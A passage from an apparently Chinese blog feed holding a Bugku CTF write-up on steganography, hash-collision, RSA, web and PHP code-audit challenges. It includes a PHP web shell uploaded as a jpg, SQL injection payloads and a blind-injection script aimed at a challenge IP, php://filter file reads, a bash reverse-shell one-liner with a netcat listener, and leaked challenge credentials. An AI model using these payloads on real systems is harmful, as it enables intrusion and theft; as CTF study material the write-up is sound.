]]></content>
      
        <categories>
            
            <category> 资料 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> docker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[bugku-writeup续]]></title>
      <url>/2018/04/03/bugku-writeup%E7%BB%AD/</url>
      <content type="html"><![CDATA[<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="账号被盗了"><a href="#账号被盗了" class="headerlink" title="账号被盗了"></a>账号被盗了</h2><a id="more"></a>
<p>先修改浏览器cookie获取，之后可以获得一个可执行文件，是cf的一个刷枪客户端，wireshark抓取一下这个客户端的访问包，可以得到</p>
<blockquote>
<p>AUTH LOGIN<br>334 VXNlcm5hbWU6<br>YmtjdGZ0ZXN0QDE2My5jb20=<br>334 UGFzc3dvcmQ6<br>YTEyMzQ1Ng==</p>
</blockquote>
<p>这些base64是用户名和密码，登录邮箱即可获得flag，由于邮箱的flag已经被删除了，所以这里附上flag</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">182100518</span>+<span class="number">725593795416</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h2><p>binwalk一下发现图面里面隐藏了很多东西，分解一下，得到很多没有后缀名的文件，这题比较坑的地方就是我不知道这些文件都是可以打开的图片，文件88里面包含了一个二维码，扫描一下即可，得到第一段；888文件修改一下后缀名为jpg即可查看一个备注信息是一段base64编码，解码得到第二段值；8888里面隐藏了一张二维码，分解扫码即可得到第三段，拼接即可得到flag</p>
<h2 id="妹子的陌陌"><a href="#妹子的陌陌" class="headerlink" title="妹子的陌陌"></a>妹子的陌陌</h2><p>上来先binwalk一下看一下，发现还包含一个RAR文件，解压文件发现有密码，查看图片发现图片上有 <code>喜欢我吗.</code> 字样，猜测这就是密码，解压成功后得到一段文本，有一段摩斯密码，解密一下发现是一个解密网站，文本又提示是aes解密，利用题目的密钥解密即可得到一个新的图片地址，访问该图片发现是一个二维码，但是黑白反相了，用PS处理一下（图像-&gt;调整-&gt;反相）                                                                                    </p>
<h2 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h2><p>音频隐写题目，用Audacity打开可以看到第一行，放大后发现像是摩斯密码，依次写出来解密一下即可，但是注意一定要是大写，小写不行。</p>
<h2 id="好多数值"><a href="#好多数值" class="headerlink" title="好多数值"></a>好多数值</h2><p>这些数值是像素点，我们要做到就是把它们重新合成图像，根据像素点个数能够求出可能的图像的规格。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可能的图片大小</span></span><br><span class="line"><span class="comment"># (1006 , 61)</span></span><br><span class="line"><span class="comment"># (503 , 122)</span></span><br><span class="line"><span class="comment"># (122 , 503)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">	x = <span class="number">503</span></span><br><span class="line">	y = <span class="number">122</span></span><br><span class="line">	im = Image.new(<span class="string">'RGB'</span>,(x,y))</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(y):</span><br><span class="line">			line = file.readline()</span><br><span class="line">			rgb = line.split(<span class="string">','</span>)</span><br><span class="line">			im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure>
<h2 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h2><p>题目给出了一堆二进制数，照常先转为16进制，发现前六位是 <code>526172</code>，查找资料可知这是RAR文件的文件头，所以导出RAR文件，解压查看图片属性即可看到一段base64，解码即可得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'''</span></span><br><span class="line"><span class="string">0101001001100001011100100010000100011010000001110000000011001111100100000111001100000000000000000000110100000000000000000000</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 这里输入二进制全文，这里只有删除了大部分的内容</span></span><br><span class="line"></span><br><span class="line">b = hex(int(s,<span class="number">2</span>))</span><br><span class="line">a = <span class="string">'52172211a0700cf907300000d00000000000000f7c07420902c000d09000059220000023e6370190a59b34a1d330700200000006b65792e6a70670'</span></span><br><span class="line"><span class="comment"># 16进制全文，注意删除前面的0x字段</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.rar'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> file:</span><br><span class="line">	file.write(a.decode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure>
<h2 id="好多压缩包"><a href="#好多压缩包" class="headerlink" title="好多压缩包"></a>好多压缩包</h2><p>下载之后是一堆压缩包，发现都有密码，打开之后看到有crc校验值，应该就是CRC32碰撞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> I <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">'123/out'</span> + str(I) + <span class="string">'.zip'</span></span><br><span class="line">        f = zipfile.ZipFile(file, <span class="string">'r'</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">'+/='</span></span><br><span class="line">f = open(<span class="string">'out.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>打开之后可以看到是一段base64，解码之后虽然部分是乱码，但是还可可以看到部分内容 <code>fix the file and get the flag</code> ，意思就是让我们修复这个文件，把解码后的内容导入到文件中，查看一下十六进制发现结尾是rar的文件尾部，推测这是RAR文件，则把文件头补齐一下，解压之后还是没有flag，于是再次查看压缩包，在注释里面找到了flag，（文件十六进制值里面有一个CMT字段，说明RAR文件存在注释）</p>
<h2 id="一个普通的压缩包-xp0intCTF"><a href="#一个普通的压缩包-xp0intCTF" class="headerlink" title="一个普通的压缩包(xp0intCTF)"></a>一个普通的压缩包(xp0intCTF)</h2><p>文件下载之后是个RAR文件，解压之后是个flag.txt，但是里面内容没有flag，所以重点应该还是在这个压缩包，网上看了别人的思路是修改了文件的十六进制值部分改为 <code>A8 3C 74</code> ，这样再次进行解压即可解压出一个png图片，但是查看十六进制值发现前缀是GIF前缀，修改后缀为GIF，在ps中有两个图层，再把这两个图层分别保存为gif文件，之后再用stegsolve查看即可看到二维码，分别保存，再在ps中上下拼接成二维码，坑点在于拼接之后的二维码还需要修复一下：将下面的图片下面的左半部分拼接左上角，另外还要讲左半部分的定位快在拼接到右上角的空块中。</p>
<h2 id="就五层你能解开吗"><a href="#就五层你能解开吗" class="headerlink" title="就五层你能解开吗"></a>就五层你能解开吗</h2><p>根据提示第一层是crc32碰撞，可以看到压缩包的3个txt文件都是6字节，所以猜测应该是用这三个TXT文件的crc32校验值来做。用github上的一个项目来做一下</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> crc32.<span class="keyword">py</span> <span class="built_in">reverse</span> <span class="number">0</span>x4dad5967</span><br></pre></td></tr></table></figure>
<p>得到</p>
<blockquote>
<p>4 bytes: {0x1b, 0xd6, 0x38, 0xc2}<br>verification checksum: 0x4dad5967 (OK)<br>alternative: 9rNYn3 (OK)<br>alternative: Ay8sZC (OK)<br>alternative: QHSaFX (OK)<br>alternative: TmQA5n (OK)<br>alternative: VQT_ls (OK)<br>alternative: X28BT9 (OK)<br>alternative: _GLQzV (OK)<br>alternative: goMEPt (OK)<br>alternative: nyUKFQ (OK)<br>alternative: t_s4f3 (OK)<br>alternative: xQxVkx (OK)<br>alternative: yQ9gpa (OK)</p>
</blockquote>
<p>把三个校验码都跑一下，然后提取其中相对有意义的结果拼起来可以得到解压密码 <code>_CRC32_i5_n0t_s4f3</code> ，第一层解开！</p>
<p>第二层是维吉尼亚密码，题目给出了近一万条密钥，直接暴力破解肯定是不可能的，但是我们发现密文第一个单词为 <code>rla</code> 只有三个字母，我们可以推测这三个字母的含义，我想了几个可能的情况</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">明文</th>
<th style="text-align:center">密文</th>
<th style="text-align:center">密钥</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">the</td>
<td style="text-align:center">rla</td>
<td style="text-align:center">yew</td>
</tr>
<tr>
<td style="text-align:center">she</td>
<td style="text-align:center">rla</td>
<td style="text-align:center">zee</td>
</tr>
<tr>
<td style="text-align:center">you</td>
<td style="text-align:center">rla</td>
<td style="text-align:center">txq</td>
</tr>
<tr>
<td style="text-align:center">key</td>
<td style="text-align:center">rla</td>
<td style="text-align:center">hhc</td>
</tr>
</tbody>
</table>
</div>
<p>查表发现只有第一个可以找到对应密钥，尝试解密一下</p>
<blockquote>
<p>the vigenere cipher is a method of encrypting alphabetic text by using a series of different caesar ciphers based on the letters of a keyword it is a simple form of polyalphabetic substitution so password is vigenere cipher funny</p>
</blockquote>
<p>语义通顺，应该就是这个，用密钥尝试解压缩包，成功，第二层解开！</p>
<p>第三次sha1碰撞，继续上脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">keys = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha1</span><span class="params">(s)</span>:</span></span><br><span class="line">    sha1_hash = hashlib.sha1()</span><br><span class="line">    sha1_hash.update(s)</span><br><span class="line">    <span class="keyword">return</span> sha1_hash.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> keys:</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">		<span class="keyword">for</span> p <span class="keyword">in</span> keys:</span><br><span class="line">			<span class="keyword">for</span> q <span class="keyword">in</span> keys:</span><br><span class="line">				password = i + <span class="string">'7'</span> + j + <span class="string">'5-'</span> + p + <span class="string">'4'</span> + q + <span class="string">'3?'</span> </span><br><span class="line">				sha = sha1(password.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">				<span class="keyword">if</span> sha[<span class="number">0</span>:<span class="number">7</span>] == <span class="string">'619c20c'</span> <span class="keyword">and</span> sha[<span class="number">8</span>] == <span class="string">'a'</span> <span class="keyword">and</span> sha[<span class="number">16</span>] == <span class="string">'9'</span>:</span><br><span class="line">					print(password)</span><br></pre></td></tr></table></figure>
<p>得到密码 <code>I7~5-s4F3?</code> ，第三次解开！</p>
<p>第四层要求两个exe文件md5值相同但是输出不同，网上查找了一下还真的是有，一个文件输出 <code>Hello World ;-)</code> ,另一个输出 <code>Goodbye World :-(</code> ，以此为密码即可解开</p>
<p>第五层折腾了好久，RSA题目做的太少了，用openssl打开ssl文件看一下</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -<span class="keyword">in</span> rsa_public_key<span class="selector-class">.pem</span> -text -modulus</span><br></pre></td></tr></table></figure>
<p>可以看到e很大，也就是指数很大，网上找了一下有个wienerattack攻击，用脚本跑一下可以得到d</p>
<blockquote>
<p>8264667972294275017293339772371783322168822149471976834221082393409363691895</p>
</blockquote>
<p>那么接下来就是生成私钥了，github上有个ctftool可以生成私钥</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -f PEM -o <span class="type">key</span>.pem -n <span class="number">46065780722597</span> -d <span class="number">826466</span> -e <span class="number">3546</span></span><br></pre></td></tr></table></figure>
<p>PS：篇幅所限，数字我都缩小了</p>
<p>然后利用生成的私钥解密</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> flag<span class="selector-class">.enc</span> -inkey key<span class="selector-class">.pem</span> -out <span class="number">1</span>.txt</span><br></pre></td></tr></table></figure>
<p>然后即可得到flag。</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="文件上传2"><a href="#文件上传2" class="headerlink" title="文件上传2"></a>文件上传2</h2><p>这个题目有点难，找了半天的资料，刚开始什么也没有，查看元素发现有个 <code>upload.php</code>，打开发现只能上传图片，试了各种方法都没有用，最后百度了一下找到了方法，直接上传jpg文件，内容如下:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="undefined"> system($_REQUEST[a])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现成功上传，传递参数<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=upload/<span class="number">201803160110346459.</span>jpg&amp;a=<span class="keyword">ls</span></span><br></pre></td></tr></table></figure></p>
<p>有个txt文件，查看一下<br><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=upload/<span class="number">201803160110346459</span>.jpg&amp;a=cat <span class="keyword">this</span><span class="number">_</span><span class="keyword">is</span><span class="number">_</span>th<span class="number">3_</span>F<span class="number">14</span>g<span class="number">_154f</span><span class="number">65</span>sd<span class="number">4</span>g<span class="number">35f</span><span class="number">4</span>d<span class="number">6f</span><span class="number">43</span>.txt</span><br></pre></td></tr></table></figure></p>
<p>如此可得到flag</p>
<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>点了确实没反应，看了提示是 <code>hint</code>，原来是要get一个hint参数为1， <code>?hint=1</code>，即可得到源代码，审计一下，只要使cookie中的ISecer的反序列化值与<strong><font face="futura">$EKY</font></strong>的反序列化全等即可。但要注意的是$KEY在序列化之前，即<code>$KEY=’’</code>，序列化为 <code>s:0:””</code></p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>题目主要过滤了空格，可以用 <code>/**/</code>绕过，这里介绍个 <font face="futura">load_file(filename)</font>可以查看文件，然后慢慢截取即可</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span><span class="comment">/**/</span>and<span class="comment">/**/</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(concat(substr(load_file(<span class="number">0x2F7661722F746573742F6B65795F312E706870</span>),<span class="number">100</span>,<span class="number">30</span>))),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>但是有一个地方贼坑，就是提交flag时的引号，一定要用题目里面要求的引号，不是英文的引号！！！</p>
<h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>发现文件泄露，访问flag即可(贼几把坑)</p>
<h2 id="文件上传2-湖湘杯"><a href="#文件上传2-湖湘杯" class="headerlink" title="文件上传2(湖湘杯)"></a>文件上传2(湖湘杯)</h2><p>这道题目没做出来，每次做文件上传类题目的时候总是没思路，这次看了别人的思路，直接文件读取居然就可以了。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">120.24</span><span class="number">.86</span><span class="number">.145</span>:<span class="number">9011</span>/?op=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>
<h2 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h2><p>扫描旁站发现一个PHPmyadmin，查看博客内容</p>
<blockquote>
<p>MySQL数据库用户名<br>define(‘DB_USER’, ‘wp’);</p>
</blockquote>
<p> MySQL数据库密码<br>define(‘DB_PASSWORD’, ‘wzTrzYRdbrbyjAx’); </p>
<p>登录即可找到flag</p>
<h2 id="login-SKCTF"><a href="#login-SKCTF" class="headerlink" title="login(SKCTF)"></a>login(SKCTF)</h2><p>题目提示是SQL布尔盲注，username字段过滤了空格等常用字符，还有逻辑符号等，新学到一个<strong><font face="futura">mid()</font></strong>函数，可以绕过for和逗号</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin'^(ascii(mid((password)from(<span class="number">1</span>)))&lt;&gt;<span class="number">55</span>)^<span class="number">0</span>#&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>
<p>直接上脚本即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://118.89.219.210:49167/"</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">flag_yes = <span class="string">'error'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">start = <span class="number">1</span></span><br><span class="line">end_signal = <span class="keyword">True</span></span><br><span class="line"><span class="keyword">while</span>(end_signal):</span><br><span class="line">	end_signal = <span class="keyword">False</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">		payload = <span class="string">"admin'^(ascii(mid((password)from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(start),str(j))</span><br><span class="line">		data[<span class="string">'username'</span>] = payload</span><br><span class="line">		res = requests.post(url,data=data).text</span><br><span class="line">		<span class="keyword">if</span> flag_yes <span class="keyword">in</span> res:</span><br><span class="line">			flag += chr(j)</span><br><span class="line">			print(flag)</span><br><span class="line">			start += <span class="number">1</span></span><br><span class="line">			end_signal = <span class="keyword">True</span></span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong>解出后的密码要md5解密，怪我太年轻。</p>
<h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><p>这个题目应该是有漏掉东西，没有给出加密后的密文，网上找一下密文，反向破解即可，贴上代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span>  <span class="comment"># 题目中应该给出的密文串</span></span><br><span class="line"></span><br><span class="line">plain = base64.b64decode(cipher)</span><br><span class="line">plain = plain.decode(<span class="string">'unicode-escape'</span>)</span><br><span class="line">plain1 = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造题目中的md5串</span></span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(<span class="string">b'ISCC'</span>)</span><br><span class="line">key = m.hexdigest()</span><br><span class="line">char = <span class="string">''</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">	<span class="keyword">if</span> x == len(key):</span><br><span class="line">		x = <span class="number">0</span></span><br><span class="line">	char += key[x]</span><br><span class="line">	x += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">numflag = []    <span class="comment"># 明文ascii码值</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Is_OK</span><span class="params">(number)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> number &gt;= <span class="number">33</span> <span class="keyword">and</span> number &lt; <span class="number">127</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">		tmp = <span class="number">128</span> * j + ord(plain[i]) - ord(char[i])</span><br><span class="line">		<span class="keyword">if</span> Is_OK(tmp):</span><br><span class="line">			numflag.append(tmp)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> numflag:</span><br><span class="line">	print(chr(i),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h2><p>这题纯学习姿势，先正常发送请求，抓包发现提示是 <code>tips</code>，base64解码，是一段php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT username,password FROM admin WHERE username='"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($row) &amp;&amp; $row[<span class="string">'password'</span>]===md5($password))&#123;&#125;</span><br></pre></td></tr></table></figure></p>
<p>题目也提示了union绕过，payload</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1</span>' union select md5(<span class="number">1</span>),md5(<span class="number">1</span>)#&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>如此即可绕过，登录后是个命令执行，接下来开始重要姿势！！！！</p>
<p><strong>反弹shell</strong></p>
<p>你的linux主机上监听一下端口</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvv <span class="number">8888</span></span><br></pre></td></tr></table></figure>
<p>然后执行命令</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; /dev/tcp/你的ip地址/<span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>如此即可成功反弹到shell!!!!(233333)</p>
<p>然后读文件即可</p>
<p><img src="bugku-writeup续/1.png" alt=""></p>
<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><p>payload<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">a</span>=240610708</span><br></pre></td></tr></table></figure></p>
<h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><p>好坑啊，提交了一个 <code>?password=9e9%00-</code>老是不对，没想到居然是 <code>?password=9e9%00*-*</code>,哎，扎心了…</p>
<h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><p>比较简单，payload<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?shiyan=<span class="built_in">flag</span>&amp;<span class="built_in">flag</span>=php:<span class="comment">//input</span></span><br><span class="line"><span class="built_in">flag</span></span><br></pre></td></tr></table></figure></p>
<p>第二行以post方式提交</p>
<h2 id="urldecode二次编码饶过"><a href="#urldecode二次编码饶过" class="headerlink" title="urldecode二次编码饶过"></a>urldecode二次编码饶过</h2><p>题目关键点在于，<strong><font face="futura">$_GET[]</font></strong>会先对得到的参数进行一次url解码，然后在函数中又进行了一次解码，所以会产生二次编码漏洞。<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="meta">%</span><span class="number">2568</span><span class="meta">%</span><span class="number">2561</span><span class="meta">%</span><span class="number">2563</span><span class="meta">%</span><span class="number">256</span>B<span class="meta">%</span><span class="number">2565</span><span class="meta">%</span><span class="number">2572</span><span class="meta">%</span><span class="number">2544</span><span class="meta">%</span><span class="number">254</span>A</span><br></pre></td></tr></table></figure></p>
<p>二次编码后提交即可。</p>
<h2 id="md5函数"><a href="#md5函数" class="headerlink" title="md5函数"></a>md5函数</h2><p>直接提交数组即可</p>
<h2 id="sha函数比较绕过"><a href="#sha函数比较绕过" class="headerlink" title="sha函数比较绕过"></a>sha函数比较绕过</h2><p>还是提交数组即可</p>
